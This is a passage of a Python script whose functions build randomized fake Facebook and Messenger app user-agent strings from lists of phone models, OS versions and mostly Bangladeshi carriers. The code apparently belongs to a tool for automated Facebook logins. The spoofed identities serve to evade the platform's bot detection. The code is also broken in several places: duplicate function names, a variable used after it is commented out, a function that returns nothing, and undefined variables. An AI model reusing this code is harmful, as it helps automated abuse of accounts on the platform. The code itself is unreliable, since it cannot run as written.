    iphone3 = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/158.0.0.44.98;FBBV/90997758;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/en_US;FBOP/5;FBRV/90997758]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/672970693;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/674179525;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D72 [FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/699723644;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/701797973;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20H350 [FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/696635672;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/700448384;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D82 [FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/707243085;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/0;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 [FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/704769221;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/708017881;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C114 [FBAN/FBIOS;FBAV/151.0.0.61.202;FBBV/82156572;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBCR/SFR;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/83160404]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/534883268;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/2;FBID/phone;FBLC/it_Qaau_IT;FBOP/5;FBRV/537932531]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H364 [FBAN/FBIOS;FBAV/441.1.0.27.105;FBBV/539464914;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/541069100]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/276.0.0.32.107;FBBV/235827610;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/469153370;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/471145542]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/627850395;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/630494309;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/FBIOS;FBAV/174.0.0.48.98;FBBV/110921384;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/3;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/112241032]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/159.0.0.48.97;FBBV/91994325;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/92489346]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 [FBAN/FBIOS;FBAV/155.0.0.36.93;FBBV/87992437;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.1.1;FBSS/2;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/89136215]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/FBIOS;FBAV/182.0.0.42.80;FBBV/118457561;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/POST;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/119485025]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/165.0.0.74.96;FBBV/100174821;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/100948865]'])
    ethan_ua_fire = ''+str(iphone1)+' '+str(agent1)+' '+str(iphone2)+' '+str(agent2)+' '+str(iphone3)+' '+str(agent3)
    return ethan_ua_fire

def maxpro1():
    ua = f'Dalvik/2.1.0 (Linux; U; Android 11; RMX{str(random.randrange(1900,2999))} Build/{str(kkkki)}) [FBAN/FB4A;FBAV/{str(rr(11,99))}.0.0.{str(rr(1,99))}.{str(rr(51,99))};FBBV/20748110;FBDM/'+'{density=2.1,width=720,height=1280};FBLC/en_GB;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+modlss+';FBSV/8.1.1;nullFBCA/armeabi-v8a:armeabi;]'
    return ua

def m2XD():
    END = '[FBAN/FB4A;FBAV/353.0.0.34.116;FBBV/349723247;FBDM/{density=2.0,width=720,height=1407};FBLC/en_US;FBRV/351349224;FBCR/Robi;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1901;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def m3XD():
    END = '[FBAN/FB4A;FBAV/353.0.0.34.116;FBBV/349723247;FBDM/{density=2.0,width=720,height=1407};FBLC/en_US;FBRV/351349224;FBCR/Robi;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1901;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
    
def m1XD():
    END = '[FBAN/FB4A;FBAV/353.0.0.34.116;FBBV/349723247;FBDM/{density=2.0,width=720,height=1407};FBLC/en_US;FBRV/351349224;FBCR/Robi;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1901;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def mm():
    END = 'Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;M2871B AppleWebKit/537.36 (KHTML, like Gecko)97 0 5871 60 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 8; Linux; Android 9;T7720L AppleWebKit/537.36 (KHTML, like Gecko)88 0 6672 140 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 8; Linux; Android 9;J409W AppleWebKit/537.36 (KHTML, like Gecko)96 0 6328 100 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]'
    
def m2XD():
    android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
    facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
    fbbv = str(random.randint(10000000, 99999999))
    fbrv = str(random.randint(10000000, 99999999))
    fbsv = f"{random.uniform(4.0, 10.0):.1f}"
    density = random.choice(["2.0","2.25","2.75","3.0","3.25","3.75"])
    width = random.randint(720, 1440)
    height = random.randint(1080, 2560)
    fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
    fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
    fban = random.choice(["FB4A", "FB5A", "FB6A"])
    fbdv = random.choice(["SGH-2100","E1182","A257 Magnet","SM-W2020","SM-G991V","SM-A307FN","SM-E5260","SM-G955F","SM-S908U","SM-G955F","SM-F936B","SM-E5260","SM-W2021","SM-A146U","SM-A135F","SM-G973F","SM-W2021","SM-A057F","SM-A305FN","SM-A505FN","SM-A507FN","SM-G991V","SM-G991V","SM-G998B","ChGalaxy S21+","SM-S911U","SM-S918W","M-S916U","SM-G730V","KOT49H","SHV-E330L","SM-A750FN","SM-A705FN","SM-A805F","SM-A910F","SM-A908B","SM-E225F","SM-E625F","SM-J200H","SM-J530F","SM-J810F"])
    fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
    #x1 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/250.0.0.26.241;FBBV/187584949;FBDM/{density=2.25,width=720,height=1332};FBLC/en_GB;FBRV/189107874;FBCR/{fbcr};FBMF/WIKO;FBBD/WIKO;FBPN/com.facebook.katana;FBDV/W-V720-EEA;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    x2 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/{fblc};FBBV/{fbbv};FBCR/{fbcr};FBMF/Samsung;FBBD/Samsung;FBPN/{fbpn};FBDV/{fbdv};FBSV/14;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
    ua = random.choice([x1,x2])
    return ua

def generate_real_ua():
    devices = [
        "Samsung SM-G970U", "Samsung SM-G973F", "Xiaomi Redmi Note 11",
        "Xiaomi Poco X3", "Vivo Y20", "Oppo F19", "Google Pixel 7"
    ]
    android_versions = ["12", "11", "10", "13"]
    fbav_versions = [f"{x}.0.0.{random.randint(1000,9999)}" for x in range(300,500)]
    fbbv_versions = [str(random.randint(1000000,9999999))]
    densities = ["2.0", "3.0", "3.5", "4.0"]
    widths = ["1080", "1440", "720"]
    heights = ["1920", "2340", "3120"]
    device = random.choice(devices)
    android = random.choice(android_versions)
    fbav = random.choice(fbav_versions)
    fbbv = random.choice(fbbv_versions)
    density = random.choice(densities)
    width = random.choice(widths)
    height = random.choice(heights)
    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {android}; {device} Build/{device.replace(' ','')}); "
        f"FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/density={density};width={width};height={height};"
        f"FBLC/en_US;FBRV/{random.randint(100000000,999999999)};FBCR/;FBMF/{device.split()[0]};"
        f"FBBD/{device.split()[0]};FBPN/com.facebook.katana;FBDV/{device};FBSV/{android};"
        f"FBOP/1;FBCA/arm64-v8a;"
    )
    return ua

def ultran():
    ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
    android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
    facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
    fbbv = str(random.randint(10000000, 99999999))
    fbsv = f"{random.uniform(4.0, 10.0):.1f}"
    density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
    width = random.randint(720, 1440)
    height = random.randint(1080, 2560)
    fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
    fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
    fban = random.choice(["FB4A", "FB5A", "FB6A"])
    fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
    u1a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux;  U; Android 10.0.1; SM-A520W Build/SKQ1.210216.001) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/135374479;FBCR/BSNL;FBMF/samsung;FBBD/samsung;FBDV/SM-A520W;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1440};FB_FW/1;]"
    return u1a

def tarek_ua():
    ver=str(random.choice(range(77,500)))
    ver2=str(random.choice(range(57,77)))
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"

def dalvik_uaa_bd_large():
    densities = [
        '{density=3.0,width=1080,height=2401}',
        '{density=3.0,width=1080,height=2161}',
        '{density=1.5,width=1280,height=720}',
        '{density=2.0,width=720,height=1344}',
        '{density=1.75,width=720,height=1488}',
        '{density=1.0,width=1066,height=552}',
        '{density=2.0,width=480,height=854}',
        '{density=1.5,width=1200,height=1848}',
        '{density=1.3312501,width=1280,height=736}',
        '{density=3.0,width=1080,height=2208}',
        '{density=4.0,width=1440,height=2392}',
        '{density=1.0,width=320,height=480}',
        '{density=3.0,width=1080,height=1920}',
        '{density=1.46875,width=720,height=1510}',
        '{density=2.625,width=1080,height=2034}',
        '{density=1.5,width=1200,height=1920}',
        '{density=2.0,width=720,height=1280}',
        '{density=2.0,width=720,height=1448}',
        '{density=1.275,width=540,height=1071}',
        '{density=3.5,width=1440,height=3120}'
    ]
    models = [
        'CPH2071', 'CPH2083', 'CPH2185', 'CPH2269', 'CPH2349',
        'RMX5303', 'RMX3636', 'SM-A528B', 'Infinix X665C', 'Pixel 7',
        'Moto G31', 'Galaxy S20', 'OnePlus 9', 'Galaxy Note20', 'Galaxy S21',
        'Vivo V21', 'Xiaomi Mi 11', 'Redmi Note 11', 'Realme 9', 'Galaxy A52',
        'Galaxy A71', 'Galaxy S10', 'Galaxy M31', 'Poco X3', 'Poco F3',
        'LG G8', 'Sony Xperia 10', 'Huawei P40', 'Huawei Mate 30', 'Nokia 5.4',
        'Nokia 7.2', 'Samsung Tab S6', 'iPhone13,4', 'iPhone14,2', 'iPad8,1',
        'iPad Air 4', 'OnePlus 8T', 'OnePlus 10', 'Oppo Reno6', 'Vivo Y73',
        'Realme 8', 'Realme GT', 'Xiaomi Mi 10', 'Redmi 10', 'Samsung S22',
        'Samsung A32', 'Pixel 6', 'Pixel 6a', 'Pixel 5', 'Galaxy Z Fold3',
        'Galaxy Z Flip3', 'Galaxy A12', 'Galaxy A31', 'Galaxy A50', 'Galaxy A70',
        'Galaxy M21', 'Galaxy M51', 'Vivo V20', 'Vivo V23', 'Vivo Y21',
        'Vivo Y33', 'Vivo Y35', 'Vivo X60', 'Oppo A54', 'Oppo A74',
        'Oppo F19', 'Oppo F17', 'Realme C25', 'Realme C21', 'Realme Narzo 50',
        'Realme Narzo 30', 'Xiaomi Redmi 9', 'Xiaomi Redmi 9A', 'Xiaomi Redmi 10C',
        'Xiaomi Poco M4', 'Xiaomi Poco X4', 'Moto G Power', 'Moto G Stylus',
        'Moto Edge 20', 'Motorola Edge 30', 'LG Velvet', 'LG Wing',
        'Sony Xperia 1 II', 'Sony Xperia 5 II', 'Nokia 3.4', 'Nokia 8.3',
        'Huawei P30', 'Huawei Mate 20', 'OnePlus Nord', 'OnePlus Nord 2',
        'Samsung Galaxy F12', 'Samsung Galaxy F22', 'Samsung Galaxy F41',
        'Samsung Galaxy F62', 'iPhone 12', 'iPhone 12 Pro', 'iPhone 12 Mini',
        'iPhone 13', 'iPhone 13 Mini', 'iPhone 13 Pro', 'iPhone 13 Pro Max',
        'iPad Mini 6', 'iPad Pro 11'
    ]
    brands = [
        'OPPO', 'Samsung', 'Infinix', 'Motorola', 'Pixel', 'OnePlus',
        'Vivo', 'Xiaomi', 'Realme', 'Redmi', 'Sony', 'Huawei',
        'Nokia', 'LG', 'Poco', 'Apple', 'iPad', 'Google',
        'Blackberry', 'Asus'
    ]
    os_versions = ['9', '10', '11', '12', '13', '14', '15', '16']
    bd_carriers = ['Grameenphone', 'Robi', 'Banglalink', 'Airtel', 'Teletalk', 'Citycell', 'SkyPhone']
    ua_list = []
    for _ in range(30):
        density = random.choice(densities)
        model = random.choice(models)
        brand = random.choice(brands)
        mobile_version = random.choice(os_versions)
        fbcr = random.choice(bd_carriers)
        ua = (
            f'Dalvik/2.1.0 (Linux; U; Android {mobile_version}; {model} Build/UP1A.231005.007) '
            f'[FBAN/FB4A;FBAV/{random.randint(450, 530)}.0.0.{random.randint(10, 99)}.{random.randint(10, 99)};'
            f'FBBV/{random.randint(460000000, 530000000)};FBDM={density};FBLC=en_GB;'
            f'FBRV/{random.randint(300000000, 400000000)};FBCR/{fbcr};FBMF/{brand};FBBD/{brand};'
            f'FBPN/com.facebook.katana;FBDV/{model};FBSV/{mobile_version};FBOP/1;FBCA/arm64-v8a:;]'
        )
        ua_list.append(ua)
    return random.choice(ua_list)

def generate_ua(carrier, brand, brand_lower, models, os_min=7, os_max=14, fbav_min=100, fbav_max=600, fbav_patch_min=10, fbav_patch_max=120, fbbv_min=200000000, fbbv_max=900000000):
    model = random.choice(models)
    fbav = f"{random.randint(fbav_min, fbav_max)}.0.0.{random.randint(fbav_patch_min, fbav_patch_max)}"
    ua = (
        f"[FBAN/FB4A;FBAV/{fbav};"
        f"FBBV/{random.randint(fbbv_min, fbbv_max)};"
        f"FBLC/en_US;"
        f"FBCR/{carrier};"
        f"FBMF/{brand};"
        f"FBBD/{brand_lower};"
        f"FBPN/com.facebook.katana;"
        f"FBDV/{model};"
        f"FBSV/{random.randint(os_min, os_max)};"
        f"FBCA/arm64-v8a;]"
    )
    return ua

def JAHID_M1():
    return generate_ua("Grameenphone", "OnePlus", "oneplus", ["One"], os_min=11, os_max=11, fbav_min=11, fbav_max=77)

def JAHID_M2():
    return generate_ua("Robi", "Samsung", "samsung", ["SM-A105F", "SM-M205F", "SM-J600F", "SM-A307FN"])
    
def JAHID_M3():
    return generate_ua("Banglalink", "Xiaomi", "xiaomi", ["Redmi Note 7", "Redmi Note 8", "Redmi Note 9", "Redmi 9A", "Redmi 10C"])

def ripon1():
	#katana
    END = "[FBAN/FB4A;FBAV/779.0.0.30.91;FBBV/71608355;FBDM/{density=2.90,width=1080,height=2200};FBLC/en_GB;FBRV/844511408;FBCR/zong;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/G3112;FBSV/10;FBOP/19;FBCA/armeabi v7a:armeabi;]"
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model3)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
model3 = ('GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020')

def arafat2():
	#orca
    END = '[FBAN/Orca-Android;FBAV/274.0.0.18.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/232793953;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A305F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(kkkkki)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
kkkkki = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','SM-S918B','SM-M146B','SM-A346B','SM-A245F','SM-A145R','SM-G955F','SM-A205GN','SM-A505GN','SM-N9005','SM-A205U','SC-02L','SM-J100H','SM-J200H','SM-J320H','SM-J400F','SM-J530F','SM-G610F','SM-M326B','SM-M426B','SM-G900FD','SM-S926U','SC-51B','SM-G981V','SM-G970F','SM-M625F','SM-M546B','SM-M536B'])
def ripon3():
	#katana
    ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/496.0.0.40.65;FBBV/458215243;[FBAN/FB4A;FBAV/446.0.0.27.352;FBBV/554350360;FBDM/{density=3.0,width=1080,height=2208};FBLC/en_US;FBRV/557952455;FBCR/Orange EG;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X6812;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
    return ua
    #katana
def ripon4():
     ua = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+";[FBAN/FB4A;FBAV/496.0.0.40.65;FBBV/458215243;[FBAN/FB4A;FBAV/442.0.0.44.114;FBBV/541369658;FBDM/{density=1.75,width=720,height=1440};FBLC/es_LA;FBRV/542881474;FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g22;FBSV/12;FBOP/19;FBCA/arm64-v8a:;]"
     return ua
def ripon5():
	#orca
    ua = f"[FBAN/Orca-Android;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+";[FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;] FBBK/1"
    return ua
    #katana
def ripon6():    
     ua = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+";[FBAN/FB4A;FBAV/66.0.0.0.85;FBBV/23262261;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/MTN Cameroon;FBMF/Royal;FBBD/Royal;FBPN/com.facebook.katana;FBDV/Royal R2;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
     return ua

def filemax():
    model = random.choice(['SM-S918B','SM-M146B','SM-A346B','SM-A245F','SM-A145R','SM-G955F','SM-A205GN','SM-A505GN','SM-N9005','SM-A205U',
                   'SC-02L','SM-J100H','SM-J200H','SM-J320H','SM-J400F','SM-J530F','SM-G610F','SM-M326B',
                   'SM-M426B','SM-G900FD','SM-S926U','SC-51B','SM-G981V','SM-G970F','SM-M625F','SM-M546B',
                   'SM-M536B','SM-M526BR','SM-M515F','GT-Y8750','SM-G925F','SM-G950U','Z987','SM-A720F','GT-I9505',
                   'SM-G900F','SM-G900I','SM-G900M','SM-G900T','SM-G900W8','SM-G900H','SM-G900FD','SM-G900P',
                   'SM-G900A','SC-04F','SM-G9008W','SM-G900L','SM-G900FQ','SM-G900K','SM-G900S','SCL23',
                   'SM-G900D','SM-G900MD','SM-G900V','SM-G900T3','SM-G900T1','SM-G9008V','SM-G9006W',
                   'SM-T835','SM-S901U','SM-S134DL','SM-J250F','SM-A217F','SM-A326B','SM-A125F','SM-A720F','SM-A326U','SM-G532M',
                   'SM-J410G','SM-A205GN','SM-A205GN','SM-A505GN','SM-G930F','SM-J210F','SM-N9005','SM-J210F','SM-A720F'])
    END = '[FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(8,14)}; {model} Build/RP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def rrr6():
	#orca
    ua = f"Dalvik/2.1.0 (Linux; U; Android "+version+"; MI 5X MIUI/V10.3.1.0.ODBCNXM) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507224;FBCR/Ooredoo;FBMF/Xiaomi;FBBD/xiaomi;FBDV/"+model+";FBSV/8.1.0;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
    return ua

def ____U_A_1____():
    facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
    fb_ver_code = str(random.randint(10000000, 66666666))
    fbrv_ver_code = str(random.randint(000000000,999999999))
    fblc_code = random.choice(['en_GB','en_US','es_LA','fr_FR','ar_AR','sv_SE','pt_BR','it_IT','nl_NL','ru_RU','ro_RO','ko_KR','hr_HR','en_Qaau_US','cs_CZ','de_DE','mk_MK','zh_HK','he_IL','uk_UA','lv_LV','el_GR','zh_TW','nb_NO','en_US AT&amp;amp-T'])
